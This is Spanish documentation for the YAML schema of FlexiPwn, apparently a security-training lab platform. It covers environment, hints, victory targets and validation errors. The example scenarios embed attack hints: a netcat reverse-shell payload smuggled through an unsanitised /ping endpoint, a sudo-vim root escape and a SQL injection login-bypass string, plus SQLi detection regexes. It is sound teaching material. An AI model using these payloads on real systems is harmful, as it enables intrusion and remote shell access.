# Schema YAML de Escenarios FlexiPwn

## Introducción

Cada escenario de FlexiPwn se define en un archivo YAML que describe el entorno Docker, las condiciones de victoria y las pistas para el estudiante. La plataforma lee este archivo al crear un *run* y lo usa para evaluar automáticamente si el participante ha completado los objetivos — sin intervención del instructor.

El motor de evaluación es completamente pasivo: nunca ejecuta comandos en el contenedor ni modifica el entorno. Solo observa eventos (archivos creados, procesos activos, líneas de log, paquetes de red) y los compara contra los targets que defines aquí. Cuando se cumplen las condiciones, el run se marca como completado y la plataforma registra la hora y el progreso.

---

## Estructura general

```yaml
# ── Metadata ────────────────────────────────────────────────────────────────
title: "Título del escenario"          # requerido
description: >                         # requerido
  Descripción larga para el estudiante.
author: "Nombre o email"               # requerido
level: beginner                        # requerido: beginner | intermediate | advanced
category: web                          # requerido: pwning | web | database | forensics | reversing

# ── Entorno Docker ───────────────────────────────────────────────────────────
environment:
  image: "nombre-imagen-vulnerable"    # requerido
  attacker_image: "nombre-imagen"      # opcional, default null
  log_paths: []                        # opcional, lista de rutas dentro del contenedor
  ports: []                            # opcional, "host:container" para el contenedor vulnerable
  attacker_ports: []                   # opcional, "host:container" para el contenedor atacante
  startup_delay_seconds: 3.0           # opcional, float, default 3.0 (usa config global si null)
  capture_filter: ""                   # opcional, filtro BPF para tcpdump (ej. "port 3306")

# ── Pistas ───────────────────────────────────────────────────────────────────
hints:                                 # opcional
  - "Primera pista (mostrada primero)"
  - "Segunda pista"

# ── Condiciones de victoria ──────────────────────────────────────────────────
targets:                               # requerido, al menos uno
  - type: file_created
    path: "/root/"
    pattern: "*.txt"
    description: "Descripción visible al estudiante"

condition: all    # "any" | "all" — aplica a targets de primer nivel sin nodos lógicos
timeout_seconds: 1800                  # default 1800 (30 min)
```

---

## Campos de metadata

| Campo | Tipo | Requerido | Valores válidos |
|-------|------|-----------|-----------------|
| `title` | string | sí | Texto libre |
| `description` | string | sí | Texto libre (soporta bloque `>`) |
| `author` | string | sí | Nombre o email |
| `level` | string | sí | `beginner` \| `intermediate` \| `advanced` |
| `category` | string | sí | `pwning` \| `web` \| `database` \| `forensics` \| `reversing` |

---

## environment

| Campo | Tipo | Requerido | Default | Descripción |
|-------|------|-----------|---------|-------------|
| `image` | string | **sí** | — | Imagen Docker del contenedor vulnerable |
| `attacker_image` | string | no | `null` | Imagen Docker del contenedor atacante |
| `log_paths` | list[string] | no | `[]` | Rutas de archivos de log **dentro del contenedor** a monitorear |
| `ports` | list[string] | no | `[]` | Mapeos de puertos del contenedor vulnerable (`"host:container"`) |
| `attacker_ports` | list[string] | no | `[]` | Mapeos de puertos del contenedor atacante (`"host:container"`) |
| `startup_delay_seconds` | float | no | `3.0` | Segundos de espera tras arrancar el contenedor. `null` usa el default global. `0.0` es válido (confía en el HEALTHCHECK del contenedor). |
| `capture_filter` | string | no | `""` | Filtro BPF para tcpdump (ej. `"port 3306"`). Vacío captura todo el tráfico. **Solo activo si hay targets de tipo `network_payload` o `network_connection`.** |

---

## hints

Lista ordenada de strings. Opcional. Las pistas se muestran al estudiante en el orden definido.

```yaml
hints:
  - "Revisa tus permisos sudo con: sudo -l"
  - "Vim puede ejecutar comandos del sistema con :!comando"
```

---

## targets

Lista de condiciones de victoria. Al menos un target es requerido. Cada target tiene un campo `type` que determina sus campos específicos.

### Tipos atómicos

#### `file_created`

Detecta cuando un archivo nuevo aparece en el filesystem del contenedor.

| Campo | Tipo | Requerido | Descripción |
|-------|------|-----------|-------------|
| `path` | string | **sí** | Ruta exacta del archivo, o directorio si termina en `/` |
| `pattern` | string | no | Glob para filtrar nombres de archivo (solo si `path` termina en `/`) |
| `description` | string | no | Descripción visible al estudiante |

**Evento Layer 2:** `file_created`

```yaml
- type: file_created
  path: "/root/"
  pattern: "*.txt"
  description: "Archivo .txt creado en /root"
```

```yaml
- type: file_created
  path: "/tmp/pwned"
  description: "Archivo /tmp/pwned creado"
```

---

#### `file_modified`

Detecta cuando un archivo preexistente es modificado.

| Campo | Tipo | Requerido | Descripción |
|-------|------|-----------|-------------|
| `path` | string | **sí** | Ruta exacta del archivo, o directorio si termina en `/` |
| `description` | string | no | Descripción visible al estudiante |

**Evento Layer 2:** `file_modified`

```yaml
- type: file_modified
  path: "/etc/passwd"
  description: "/etc/passwd fue modificado"
```

---

#### `file_exists`

Comprueba mediante polling que un archivo existe (opcionalmente con contenido específico).

| Campo | Tipo | Requerido | Descripción |
|-------|------|-----------|-------------|
| `path` | string | **sí** | Ruta exacta del archivo |
| `contains` | string | no | Subcadena que debe aparecer en el contenido del archivo |
| `description` | string | no | Descripción visible al estudiante |

**Evento Layer 2:** `file_exists`

```yaml
- type: file_exists
  path: "/root/flag.txt"
  contains: "FLAG{"
  description: "Flag encontrada en /root/flag.txt"
```

---

#### `process_running`

Detecta cuando un proceso se ejecuta con un UID efectivo y comando específicos.

| Campo | Tipo | Requerido | Descripción |
|-------|------|-----------|-------------|
| `euid` | int | **sí** | UID efectivo del proceso (0 = root) |
| `cmd_contains` | string | **sí** | Subcadena que debe aparecer en la línea de comando |
| `ppid_cmd_contains` | string | no | Subcadena que debe aparecer en el comando del proceso padre |
| `ancestor_contains` | string | no | Subcadena que debe aparecer en el comando de cualquier ancestro |
| `description` | string | no | Descripción visible al estudiante |

**Evento Layer 2:** `process_spawned`

Todas las condiciones especificadas deben cumplirse (lógica AND).

```yaml
- type: process_running
  euid: 0
  cmd_contains: "bash"
  ppid_cmd_contains: "vim"
  ancestor_contains: "sudo"
  description: "Shell root lanzada desde vim vía sudo"
```

---

#### `log_pattern`

Detecta entradas de log que coincidan con patrones regex.

| Campo | Tipo | Requerido | Descripción |
|-------|------|-----------|-------------|
| `field_matches` | dict[str, str] | **sí** | Mapa de campo → regex. Todos los patrones deben coincidir. |
| `description` | string | no | Descripción visible al estudiante |

**Evento Layer 2:** `log_entry`

Campos disponibles en `field_matches`:
- `raw_line` — línea cruda de log (texto plano)
- Cualquier campo del objeto JSON parseado (para logs estructurados)

El matching usa `re.search()` (el patrón puede aparecer en cualquier posición). Case-sensitive por defecto.

```yaml
- type: log_pattern
  field_matches:
    raw_line: "SELECT.*sensitive_data"
  description: "Query sobre sensitive_data en logs MySQL"
```

```yaml
- type: log_pattern
  field_matches:
    event_type: "authentication_success"
  description: "Login exitoso registrado en log de aplicación"
```

Requiere que `log_paths` esté configurado en `environment`.

---

#### `network_payload`

Detecta payloads de paquetes de red que coincidan con un patrón regex.

| Campo | Tipo | Requerido | Descripción |
|-------|------|-----------|-------------|
| `field_matches` | dict[str, str] | **sí** | La clave se ignora; el valor es regex aplicado al campo `data` del payload |
| `description` | string | no | Descripción visible al estudiante |

**Evento Layer 2:** `network_payload`

El matching es **case-insensitive** y usa `re.search()`. El campo `data` contiene el ASCII imprimible extraído del payload del paquete.

```yaml
- type: network_payload
  field_matches:
    data: "SELECT.*users"
  description: "Query SQL sobre users detectada en tráfico"
```

```yaml
- type: network_payload
  field_matches:
    data: "OR.*1.*=.*1|UNION.*SELECT|#"
  description: "Patrón de SQLi en tráfico de red"
```

Requiere `attacker_image` y opcionalmente `capture_filter` en `environment`.

---

#### `network_connection`

Detecta conexiones TCP establecidas hacia un puerto específico. Se activa en paquetes SYN-ACK (indica conexión establecida exitosamente).

| Campo | Tipo | Requerido | Descripción |
|-------|------|-----------|-------------|
| `dst_port` | int | **sí** | Puerto de destino a detectar |
| `dst_ip` | string | no | IP de destino (si se omite, coincide con cualquier IP) |
| `description` | string | no | Descripción visible al estudiante |

**Evento Layer 2:** `network_connection`

```yaml
- type: network_connection
  dst_port: 4444
  description: "Reverse shell hacia puerto 4444 detectada"
```

```yaml
- type: network_connection
  dst_port: 443
  dst_ip: "10.0.0.5"
  description: "Conexión HTTPS al servidor C2"
```

Requiere `attacker_image` en `environment`.

---

### Tipos lógicos (nodos recursivos)

Los nodos lógicos permiten combinar targets con lógica booleana. Son recursivos: pueden contener otros nodos lógicos.

**Restricción:** Los nodos `not` no pueden ser targets de primer nivel. Deben ir dentro de un `and` o `or`.

#### `and`

Todos los sub-targets deben cumplirse.

Requiere al menos 2 sub-targets.

```yaml
- type: and
  targets:
    - type: file_created
      path: "/root/flag.txt"
    - type: process_running
      euid: 0
      cmd_contains: "bash"
  description: "Flag creada Y shell root activa"
```

#### `or`

Al menos un sub-target debe cumplirse.

Requiere al menos 2 sub-targets.

```yaml
- type: or
  targets:
    - type: network_payload
      field_matches:
        data: "password=admin"
    - type: log_pattern
      field_matches:
        raw_line: "authentication failure"
  description: "Ataque detectado por red o por logs"
```

#### `not`

El sub-target no debe cumplirse.

Requiere exactamente 1 sub-target.

```yaml
- type: and
  targets:
    - type: file_created
      path: "/root/flag.txt"
    - type: not
      targets:
        - type: log_pattern
          field_matches:
            raw_line: "ALARM"
      description: "Sin alertas en logs"
  description: "Flag creada sin disparar alertas"
```

---

### Tipos NO implementados

Los siguientes tipos están definidos en el schema pero fuera del scope de implementación actual. Incluirlos en un escenario generará un error de validación o no producirá eventos.

| Tipo | Descripción |
|------|-------------|
| `http_response_contains` | Verificar que una respuesta HTTP contiene texto esperado |
| `database_query_result` | Verificar que una query a base de datos retorna un resultado esperado |

---

## condition

Aplica **solo a targets de primer nivel** cuando no se usan nodos lógicos (`and`/`or`/`not`).

| Valor | Comportamiento |
|-------|---------------|
| `any` | El escenario se completa cuando **al menos un** target de primer nivel se cumple |
| `all` | El escenario se completa cuando **todos** los targets de primer nivel se cumplen |

Cuando se usan nodos lógicos, `condition` es ignorado: la lógica la determinan los nodos.

---

## timeout_seconds

Duración máxima de la sesión en segundos. Si el estudiante no completa el escenario en este tiempo, la sesión termina como fallida.

- Tipo: `int`
- Default: `1800` (30 minutos)

---

## Ejemplos completos

### 1. privesc-demo.yaml — Escalación de privilegios (sin red)

```yaml
title: "Privilege escalation via sudo vim"
description: >
  El usuario ctfuser tiene permisos sudo sobre vim sin contraseña.
  Escala privilegios y crea evidencia de acceso root.
author: "Dylan Riquelme"
level: beginner
category: pwning

environment:
  image: "flexipwn/vuln-sudo"
  startup_delay_seconds: 3

hints:
  - "Revisa tus permisos sudo con: sudo -l"
  - "Vim puede ejecutar comandos del sistema con :!comando"

targets:
  - type: file_created
    path: "/root/"
    pattern: "*.txt"
    description: "Archivo .txt creado en directorio root"

  - type: file_modified
    path: "/etc/passwd"
    description: "Archivo de usuarios del sistema modificado"

  - type: process_running
    euid: 0
    cmd_contains: "bash"
    ppid_cmd_contains: "vim"
    ancestor_contains: "sudo"
    description: "Shell root lanzada desde vim (escalación exitosa)"

condition: all
timeout_seconds: 1800
```

**Qué monitorea:** filesystem (`file_created`, `file_modified`) y procesos (`process_running`). No levanta contenedor atacante ni captura red.

---

### 2. sqli-mysql-demo.yaml — SQL Injection (logs + red con filtro)

```yaml
title: "SQL injection login bypass"
description: >
  La aplicación tiene una vulnerabilidad de SQL injection en el formulario
  de login. Explota la vulnerabilidad para autenticarte sin credenciales
  válidas y acceder a datos de la tabla sensitive_data.
author: "Dylan Riquelme"
level: beginner
category: web

environment:
  image: "flexipwn/vuln-sqli-mysql"
  attacker_image: "flexipwn/attacker"
  log_paths:
    - "/var/log/mysql/general.log"
    - "/var/log/app/app.log"
  ports:
    - "5000:5000"
  capture_filter: "port 3306"
  startup_delay_seconds: 10.0

hints:
  - "Prueba ingresar una comilla simple en el campo de usuario"
  - "El operador OR puede ser útil para evadir condiciones AND"
  - "Ejemplo: admin' OR '1'='1' #"

targets:
  - type: log_pattern
    field_matches:
      raw_line: "SELECT.*sensitive_data"
    description: "Query SQL sobre tabla sensitive_data detectada"

  - type: log_pattern
    field_matches:
      raw_line: "OR.*1.*=.*1|UNION.*SELECT|#"
    description: "Patrón de SQL injection detectado en query ejecutada"

  - type: log_pattern
    field_matches:
      event_type: "authentication_success"
    description: "Login exitoso detectado en log de aplicación"

  - type: network_payload
    field_matches:
      data: "SELECT.*users"
    description: "Query SQL sobre tabla users detectada en tráfico de red"

  - type: network_payload
    field_matches:
      data: "OR.*1.*=.*1|UNION.*SELECT|#"
    description: "Patrón de SQL injection detectado en tráfico de red"

  - type: network_payload
    field_matches:
      data: "FLAG\\{sql_injection_detected\\}|internal-api-key-xyz"
    description: "Datos sensibles filtrados detectados en respuesta de red"

condition: all
timeout_seconds: 18000
```

**Qué monitorea:** logs de MySQL y aplicación (`log_pattern`) y tráfico de red filtrado al puerto 3306 (`network_payload`). El `capture_filter: "port 3306"` limita tcpdump solo al tráfico MySQL, reduciendo ruido.

---

### 3. command-injection-demo.yaml — Inyección de comandos → Reverse Shell (red sin filtro)

```yaml
title: "Command Injection → Reverse Shell"
description: >
  La aplicación vulnerable expone un endpoint /ping?host=... que ejecuta
  el comando sin sanitizar. Explota la inyección para establecer una reverse
  shell desde el servidor hacia tu máquina atacante.
author: "Dylan Riquelme"
level: intermediate
category: web

environment:
  image: "flexipwn/vuln-command-injection"
  attacker_image: "flexipwn/attacker"
  attacker_ports:
    - "2222:22"
  startup_delay_seconds: 3.0

hints:
  - "El env_id se muestra al iniciar el run. Los contenedores se llaman flexipwn-{env_id}-vulnerable y flexipwn-{env_id}-attacker dentro de la red interna."
  - "Primero entra al atacante por SSH (puerto expuesto en la CLI) y abre un listener: nc -lvp 4444"
  - "Desde el atacante, envía el payload al vulnerable: curl 'http://flexipwn-{env_id}-vulnerable:5000/ping?host=;nc+flexipwn-{env_id}-attacker+4444+-e+/bin/bash'"
  - "El endpoint /ping ejecuta el comando sin sanitizar"

targets:
  - type: network_connection
    dst_port: 4444
    description: "Conexión TCP hacia el puerto 4444 del atacante detectada"

  - type: file_created
    path: "/root/"
    pattern: "*.txt"
    description: "Archivo .txt creado en directorio root"

condition: all
timeout_seconds: 1800
```

**Qué monitorea:** conexión TCP establecida al puerto 4444 (`network_connection`) y filesystem (`file_created`). Sin `capture_filter`, tcpdump captura todo el tráfico entre contenedores. `attacker_ports` expone SSH del atacante al host para que el estudiante pueda conectarse.

---

## Errores comunes

### 1. Falta el campo `path` en un target de filesystem

**Error:**
```
ValueError: El tipo 'file_created' requiere el campo 'path'
```

**Causa:** Los tipos `file_created`, `file_modified` y `file_exists` requieren `path` obligatoriamente.

**Corrección:**
```yaml
# Incorrecto
- type: file_created
  description: "Flag creada"

# Correcto
- type: file_created
  description: "Flag creada"
  path: "/root/pwned.txt"
```

---

### 2. Lista `targets` vacía

**Error:**
```
ValueError: El escenario debe tener al menos un target
```

**Causa:** Un escenario sin targets no tiene condición de victoria — la plataforma lo rechaza.

**Corrección:** Define al menos un target con su tipo y descripción.

---

### 3. Nivel inválido

**Error:**
```
ValidationError: Input should be 'beginner', 'intermediate' or 'advanced'
```

**Causa:** El campo `level` solo acepta los tres valores exactos.

**Corrección:**
```yaml
# Incorrecto
level: expert

# Correcto
level: advanced
```

---

### 4. `pattern` sin directorio (path sin `/` al final)

**Problema:** El campo `pattern` solo tiene efecto cuando `path` termina en `/`. Si defines `pattern` con un path de archivo exacto, se ignora silenciosamente.

```yaml
# No tiene el efecto esperado — pattern se ignora
- type: file_created
  path: "/root/pwned.txt"
  pattern: "*.txt"

# Correcto — vigilar cualquier .txt en el directorio
- type: file_created
  path: "/root/"
  pattern: "*.txt"
```

---

### 5. `contains` con `file_created` en vez de `file_exists`

**Problema:** El campo `contains` (verificar contenido) solo funciona con `file_exists`. En `file_created` no tiene efecto — ese tipo solo detecta la creación, no lee el contenido.

```yaml
# Incorrecto — contains se ignora en file_created
- type: file_created
  path: "/root/flag.txt"
  contains: "FLAG{ok}"

# Correcto — usar file_exists para verificar contenido
- type: file_exists
  path: "/root/flag.txt"
  contains: "FLAG{ok}"
```

---

### 6. `not` como target de primer nivel

**Error:**
```
ValidationError: El nodo lógico 'not' no puede ser un target de primer nivel
```

**Causa:** Un escenario que solo tiene un `not` se completaría por la ausencia de un evento — peligroso (puede completarse sin acción del estudiante). Debe envolverse en un `and` o `or` con al menos un target positivo.

**Corrección:**
```yaml
# Incorrecto
targets:
  - type: not
    targets:
      - type: log_pattern
        field_matches:
          raw_line: "ALARM"

# Correcto
targets:
  - type: and
    targets:
      - type: file_created
        path: "/root/flag.txt"
      - type: not
        targets:
          - type: log_pattern
            field_matches:
              raw_line: "ALARM"
```

---

### 7. Imagen Docker no disponible localmente

**Error en tiempo de ejecución:**
```
ImageNotFoundError: La imagen 'flexipwn/mi-lab:1.0' no existe localmente ni en el registro.
```

**Causa:** La imagen especificada en `environment.image` no está disponible. La plataforma no construye imágenes automáticamente.

**Corrección:** Asegúrate de que la imagen esté publicada en un registro accesible o disponible localmente con `docker pull` o `docker build` (ver sección de instalación del README).

---

### 8. `capture_filter` sin targets de red

**Problema:** El `capture_filter` solo tiene efecto si el escenario tiene targets de tipo `network_payload` o `network_connection`. Definirlo sin esos targets no levanta el sniffer y es ruido en el YAML.

**Corrección:** Si no usás `network_*` targets, omití `capture_filter` y `attacker_image` (para escenarios sin red).
